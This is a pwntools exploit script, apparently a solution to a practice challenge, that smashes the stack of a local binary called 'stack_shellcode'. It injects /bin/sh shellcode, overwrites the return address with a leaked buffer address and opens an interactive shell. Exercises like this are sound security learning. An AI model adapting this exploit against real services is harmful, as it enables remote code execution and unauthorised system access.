#!/usr/bin/python3
from pwn import *
PATH = './stack_shellcode'
ADDR = '127.0.0.1'
PORT = 9007
elf = context.binary = ELF(PATH)
context.log_level = 'debug'
gs = '''
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    elif args.REMOTE:
        return remote(ADDR,PORT)
    elif args.GDBWIN:
        context.terminal = ['wt.exe','wsl.exe','script', '-q', 'gdb_sess', '-c']
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)
io = start()
######################
io.recvuntil(b'buffer @ ')
buffer_addr = int(io.recvline().strip(), 16)
log.info(f"Buffer address: {hex(buffer_addr)}")
#payload = b'\xCC' + asm(shellcraft.sh())
payload = asm(shellcraft.sh())
payload += b'A' * (120- len(payload))
payload += p64(buffer_addr)
#payload = cyclic(250) # 120
log.info(f"{cyclic_find(b'faab')}")
io.sendlineafter(b'Enter some text: ', payload)
io.interactive()
